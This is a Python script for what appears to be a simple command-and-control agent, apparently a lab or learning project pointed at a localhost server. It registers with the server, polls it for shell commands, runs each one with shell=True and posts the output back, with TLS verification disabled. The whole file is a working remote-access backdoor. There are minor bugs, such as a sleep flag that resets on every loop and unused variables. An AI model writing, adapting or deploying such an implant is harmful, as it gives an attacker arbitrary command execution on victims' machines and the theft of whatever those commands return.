import requests
import time
import subprocess
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def register():
    print("Agent started\n")
    print("Registering Agent ... \n")
    response = requests.get(url="https://127.0.0.1:5000/agent/register", verify=False)
    uuid = response.text
    print("Agent registered with: " + uuid)
    return uuid


uuid = register()


def get_commands():
    command = requests.get(url="https://127.0.0.1:5000/agent/" + uuid + "/command", verify=False)
    cmd = command.text
    command = ""
    get_uuid = ""
    sleep = ""

    found = False
    uuid_found = False

    for c in cmd:
        if c == ";":
            found = True
            continue

        if not found:
            command += c
        else:
            sleep += c

    return command, sleep

while True:
    first_sleep = False
    if not first_sleep:
        time.sleep(30)
        first_sleep = True
    else:
        time.sleep(sleep)

    cmd, sleep  = get_commands()
    print("Got: " + cmd)

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    requests.post(url=f"https://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"}, verify=False)

